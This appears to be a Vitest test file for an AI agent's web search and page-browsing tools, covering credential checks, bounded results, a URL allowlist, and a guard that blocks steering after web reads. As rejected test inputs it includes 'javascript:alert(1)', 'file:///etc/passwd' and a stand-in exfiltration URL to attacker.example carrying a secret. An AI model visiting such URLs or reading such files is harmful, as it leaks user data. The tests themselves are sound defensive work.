import { afterEach, expect, test, vi } from 'vitest';
import type { AgentExtensionAPI, AgentTasks } from 'runling/agents';
import {
  browseWeb,
  createUrlAllowlist,
  guardTaskSteering,
  searchWeb,
  webExtension,
  webSettings,
  webTools
} from './web.ts';
import { ConfigurationError } from './settings.ts';

const ACCOUNT = '0123456789abcdef0123456789abcdef';
const cloudflare = { accountId: ACCOUNT, apiToken: 'cf-token' };

afterEach(() => {
  vi.unstubAllEnvs();
});

test('web access is opt-in and validates Cloudflare credentials', () => {
  for (const name of [
    'CHATTO_TAVILY_API_KEY',
    'CHATTO_CLOUDFLARE_ACCOUNT_ID',
    'CHATTO_CLOUDFLARE_API_TOKEN'
  ])
    vi.stubEnv(name, '');
  expect(webSettings()).toBeUndefined();
  expect(webTools(undefined)).toEqual([]);
  vi.stubEnv('CHATTO_TAVILY_API_KEY', ' tvly-key ');
  expect(webSettings()).toEqual({ tavilyApiKey: 'tvly-key' });
  vi.stubEnv('CHATTO_CLOUDFLARE_ACCOUNT_ID', ACCOUNT);
  expect(() => webSettings()).toThrow(ConfigurationError);
  vi.stubEnv('CHATTO_CLOUDFLARE_API_TOKEN', 'cf-token');
  expect(webSettings()).toEqual({ tavilyApiKey: 'tvly-key', cloudflare });
  expect(webTools(webSettings())).toEqual(['webSearch', 'browsePage']);
  vi.stubEnv('CHATTO_CLOUDFLARE_ACCOUNT_ID', 'not-an-account');
  expect(() => webSettings()).toThrow('32-character account ID');
});

test('searches through Tavily and returns bounded public results', async () => {
  const request = vi.fn<typeof fetch>().mockResolvedValue(
    Response.json({
      results: [
        { title: 'Chatto', url: 'https://example.com/a', content: 'x'.repeat(2_000), score: 1 },
        { title: 'Script', url: 'javascript:alert(1)', content: 'no' },
        { title: 'Two', url: 'https://example.com/b', content: 'two' }
      ]
    })
  );
  const results = await searchWeb('tvly-key', 'chatto bots', { maxResults: 9 }, undefined, request);
  expect(results).toEqual([
    { title: 'Chatto', url: 'https://example.com/a', snippet: 'x'.repeat(1_000) },
    { title: 'Two', url: 'https://example.com/b', snippet: 'two' }
  ]);
  const [url, init] = request.mock.calls[0]!;
  expect(url).toBe('https://api.tavily.com/search');
  expect(init).toMatchObject({ method: 'POST', redirect: 'error' });
  expect((init!.headers as Record<string, string>).authorization).toBe('Bearer tvly-key');
  expect(JSON.parse(init!.body as string)).toEqual({
    query: 'chatto bots',
    search_depth: 'basic',
    topic: 'general',
    max_results: 5,
    include_answer: false,
    include_raw_content: false,
    include_images: false
  });
});

test('service errors name only the service and status', async () => {
  const request = vi
    .fn<typeof fetch>()
    .mockResolvedValue(new Response('invalid key tvly-key', { status: 401 }));
  const error = await searchWeb('tvly-key', 'q', {}, undefined, request).catch((e: Error) => e);
  expect(error).toBeInstanceOf(Error);
  expect((error as Error).message).toBe('Web search request failed with status 401');
  request.mockRejectedValue(new Error('connect ECONNREFUSED with cf-token'));
  await expect(browseWeb(cloudflare, 'https://example.com/', undefined, request)).rejects.toThrow(
    /^Browser Run request failed or was cancelled$/
  );
});

test('renders pages through Cloudflare Browser Run with bounded Markdown', async () => {
  const request = vi
    .fn<typeof fetch>()
    .mockResolvedValue(Response.json({ success: true, result: `# Page\n${'y'.repeat(31_000)}` }));
  const page = await browseWeb(cloudflare, 'https://example.com/path?q=1#top', undefined, request);
  expect(page.url).toBe('https://example.com/path?q=1');
  expect(page.text).toHaveLength(30_000);
  expect(page.truncated).toBe(true);
  const [url, init] = request.mock.calls[0]!;
  expect(url).toBe(`https://api.cloudflare.com/client/v4/accounts/${ACCOUNT}/browser-run/markdown`);
  expect((init!.headers as Record<string, string>).authorization).toBe('Bearer cf-token');
  expect(JSON.parse(init!.body as string)).toEqual({ url: 'https://example.com/path?q=1' });
  request.mockResolvedValue(Response.json({ success: false, errors: [{ code: 1 }] }));
  await expect(browseWeb(cloudflare, 'https://example.com/', undefined, request)).rejects.toThrow(
    'could not render'
  );
});

test.each(['file:///etc/passwd', 'ftp://example.com/', 'https://user:pw@example.com/', 'nope'])(
  'rejects %s before contacting Cloudflare',
  async (url) => {
    const request = vi.fn<typeof fetch>();
    await expect(browseWeb(cloudflare, url, undefined, request)).rejects.toThrow();
    expect(request).not.toHaveBeenCalled();
  }
);

test('the browse allowlist keeps exact known URLs and resolves page-relative links', () => {
  const allowlist = createUrlAllowlist();
  allowlist.addFrom('Read https://example.com/guide, then (https://example.com/faq#top).');
  expect(allowlist.has('https://example.com/guide')).toBe(true);
  expect(allowlist.has('https://example.com/faq')).toBe(true);
  expect(allowlist.has('https://example.com/guide?leak=thread-text')).toBe(false);
  expect(allowlist.has('https://attacker.example/')).toBe(false);
  allowlist.addFrom('[Install](/docs/install) and [Next](next.md)', 'https://example.com/docs/');
  expect(allowlist.has('https://example.com/docs/install')).toBe(true);
  expect(allowlist.has('https://example.com/docs/next.md')).toBe(true);
  allowlist.addFrom('[Relative](/ignored)');
  expect(allowlist.has('https://example.com/ignored')).toBe(false);
});

test('browsePage opens only allowlisted URLs within its budget and adds links from pages it reads', async () => {
  const tools = new Map<string, { execute(id: string, input: never): Promise<unknown> }>();
  const allowlist = createUrlAllowlist();
  allowlist.addFrom('https://example.com/start');
  const onWebContent = vi.fn();
  const request = vi
    .fn<typeof fetch>()
    .mockImplementation(async () => Response.json({ success: true, result: '[Next](/next)' }));
  let browsesLeft = 2;
  const extension = webExtension(
    { cloudflare },
    { onWebContent, allowlist, takeBrowse: () => browsesLeft-- > 0 },
    request
  );
  const factory = typeof extension === 'function' ? extension : extension.factory;
  await factory({
    registerTool(tool) {
      tools.set(tool.name, tool as never);
    }
  } as AgentExtensionAPI);
  const browse = (url: string) => tools.get('browsePage')!.execute('call', { url } as never);
  await expect(browse('https://attacker.example/?d=secret')).rejects.toThrow('can open only');
  expect(request).not.toHaveBeenCalled();
  expect(onWebContent).not.toHaveBeenCalled();
  await browse('https://example.com/start');
  expect(onWebContent).toHaveBeenCalledOnce();
  await browse('https://example.com/next');
  expect(request).toHaveBeenCalledTimes(2);
  await expect(browse('https://example.com/next')).rejects.toThrow('page limit');
  expect(request).toHaveBeenCalledTimes(2);
});

test('the steering guard blocks only send and keeps other task operations', async () => {
  let blocked = true;
  const tasks = {
    send: vi.fn(async () => {}),
    cancel: vi.fn(),
    get active() {
      return true;
    }
  } as unknown as AgentTasks;
  const guarded = guardTaskSteering(tasks, () => blocked);
  expect(() => guarded.send('task', 'message')).toThrow('blocked after reading web content');
  expect(tasks.send).not.toHaveBeenCalled();
  guarded.cancel('task');
  expect(tasks.cancel).toHaveBeenCalledWith('task');
  expect(guarded.active).toBe(true);
  blocked = false;
  await guarded.send('task', 'message');
  expect(tasks.send).toHaveBeenCalledWith('task', 'message');
});
